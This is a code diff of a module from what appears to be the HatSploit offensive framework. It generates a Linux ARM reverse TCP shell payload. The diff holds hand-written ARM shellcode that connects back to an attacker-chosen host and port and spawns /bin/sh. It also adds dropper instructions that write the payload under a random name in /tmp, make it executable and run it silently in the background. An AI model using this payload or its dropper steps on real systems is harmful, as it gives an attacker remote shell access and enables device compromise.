@@ -24,16 +24,15 @@
 # SOFTWARE.
 #
 
-from core.lib.payload import HatSploitPayload
+from core.lib.payload import Payload
+from utils.payload.payload import PayloadGenerator
+from utils.tcp.tcp import TCPClient
+from utils.string.string import StringTools
 
-from utils.tcp.tcp import tcp
-from utils.payload.payload_generator import payload_generator
 
-class HatSploitPayload(HatSploitPayload):
-    tcp = tcp()
-    payload_generator = payload_generator()
-
+class HatSploitPayload(Payload, PayloadGenerator, TCPClient, StringTools):
     details = {
+        'Category': "stager",
         'Name': "Linux armle Shell Reverse TCP",
         'Payload': "linux/armle/shell_reverse_tcp",
         'Authors': [
@@ -46,6 +45,7 @@ class HatSploitPayload(HatSploitPayload):
         'Comments': [
             ''
         ],
+        'Architecture': "armle",
         'Platform': "linux",
         'Risk': "high",
         'Type': "reverse_tcp"
@@ -54,7 +54,7 @@ class HatSploitPayload(HatSploitPayload):
     options = {
         'LHOST': {
             'Description': "Local host.",
-            'Value': tcp.get_local_host(),
+            'Value': TCPClient.get_local_host(),
             'Type': "ip",
             'Required': True
         },
@@ -73,44 +73,46 @@ class HatSploitPayload(HatSploitPayload):
     }
 
     def run(self):
-        local_host, local_port, executable_format = self.parser.parse_options(self.options)
+        local_host, local_port, executable_format = self.parse_options(self.options)
 
-        local_host = self.payload_generator.host_to_bytes(local_host)
-        local_port = self.payload_generator.port_to_bytes(local_port)
+        local_host = self.host_to_bytes(local_host)
+        local_port = self.port_to_bytes(local_port)
 
-        if not executable_format in self.payload_generator.formats.keys():
-            self.badges.output_error("Invalid executable format!")
+        if executable_format not in self.formats.keys():
+            self.output_error("Invalid executable format!")
             return
 
-        self.badges.output_process("Generating shellcode...")
+        self.output_process("Generating shellcode...")
         shellcode = (
-            b"\x01\x10\x8F\xE2" +
-            b"\x11\xFF\x2F\xE1" +
-            b"\x02\x20\x01\x21" +
-            b"\x92\x1A\x0F\x02" +
-            b"\x19\x37\x01\xDF" +
-            b"\x06\x1C\x08\xA1" +
-            b"\x10\x22\x02\x37" +
-            b"\x01\xDF\x3F\x27" +
-            b"\x02\x21\x30\x1c" +
-            b"\x01\xdf\x01\x39" +
-            b"\xFB\xD5\x05\xA0" +
-            b"\x92\x1a\x05\xb4" +
-            b"\x69\x46\x0b\x27" +
-            b"\x01\xDF\xC0\x46" +
-            b"\x02\x00" + local_port +  # "\x12\x34" struct sockaddr and port
-            local_host +                # reverse ip address
-            b"\x2f\x62\x69\x6e" +       # /bin
-            b"\x2f\x73\x68\x00"         # /sh\0
+                b"\x01\x10\x8F\xE2" +
+                b"\x11\xFF\x2F\xE1" +
+                b"\x02\x20\x01\x21" +
+                b"\x92\x1A\x0F\x02" +
+                b"\x19\x37\x01\xDF" +
+                b"\x06\x1C\x08\xA1" +
+                b"\x10\x22\x02\x37" +
+                b"\x01\xDF\x3F\x27" +
+                b"\x02\x21\x30\x1c" +
+                b"\x01\xdf\x01\x39" +
+                b"\xFB\xD5\x05\xA0" +
+                b"\x92\x1a\x05\xb4" +
+                b"\x69\x46\x0b\x27" +
+                b"\x01\xDF\xC0\x46" +
+                b"\x02\x00" + local_port +  # "\x12\x34" struct sockaddr and port
+                local_host +  # reverse ip address
+                b"\x2f\x62\x69\x6e" +  # /bin
+                b"\x2f\x73\x68\x00"  # /sh\0
         )
 
-        self.badges.output_process("Generating payload...")
-        payload = self.payload_generator.generate(executable_format, 'armle', shellcode)
+        self.output_process("Generating payload...")
+        payload = self.generate(executable_format, 'armle', shellcode)
+
+        filename = self.random_string()
 
         instructions = ""
-        instructions += "cat >/tmp/.payload;"
-        instructions += "chmod 777 /tmp/.payload;"
-        instructions += "sh -c '/tmp/.payload' 2>/dev/null &"
+        instructions += f"cat >/tmp/{filename};"
+        instructions += f"chmod 777 /tmp/{filename};"
+        instructions += f"sh -c '/tmp/{filename}' 2>/dev/null &"
         instructions += "\n"
 
         self.payload = payload
